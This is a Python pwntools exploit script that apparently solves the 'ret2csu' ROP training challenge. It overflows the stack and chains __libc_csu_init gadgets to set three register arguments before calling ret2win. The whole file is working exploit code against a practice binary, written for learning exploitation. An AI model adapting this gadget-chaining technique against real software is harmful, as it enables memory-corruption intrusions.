#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'ret2csu')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./ret2csu_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

padding = b'A' * cyclic_find(0x6161616b)

# (gdb) disassemble __libc_csu_init
#   0x0000000000400680 <+64>:	mov    rdx,r15
#   0x0000000000400683 <+67>:	mov    rsi,r14
#   0x0000000000400686 <+70>:	mov    edi,r13d
#   0x0000000000400689 <+73>:	call   QWORD PTR [r12+rbx*8]
CSU_GADGET = p64(0x400680)

# (r2) iS - sections adresses
# (r2) pd @ 0x004004f0 - .plt section
# ╎   ;-- ret2win:
# ╎   0x00400510      ff250a0b2000   jmp qword [reloc.ret2win]   ; [0x601020:8]=0x400516
RET2WIN = p64(0x400510)

# (r2) iS - sections adresses
# (r2) pd @ 0x00600e00 - .dynamic section
# 0x00600e48      .qword 0x00000000004006b4 ; section..fini ; sym._fini
DYNAMIC_FINI = p64(0x600e48)

# ropper --arch x86_64 --file ret2csu --inst-count 8
# 0x000000000040069a: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
# 0x00000000004006a3: pop rdi; ret;
POP_RBX_RBP_R12_R13_R14_R15 = p64(0x40069a)
POP_RDI = p64(0x4006a3)

ARG_1 = p64(0xdeadbeefdeadbeef)
ARG_2 = p64(0xcafebabecafebabe)
ARG_3 = p64(0xd00df00dd00df00d)
ARGS = ARG_1 + ARG_2 + ARG_3

payload  = padding + POP_RDI + ARG_1
payload += POP_RBX_RBP_R12_R13_R14_R15
payload += p64(0x0) + p64(0x1) + DYNAMIC_FINI + ARGS
payload += CSU_GADGET + 7*p64(0xa5) + POP_RDI
payload += ARG_1 + RET2WIN

io = start()

io.recvuntil(b"> ")
io.sendline(payload)

io.interactive()
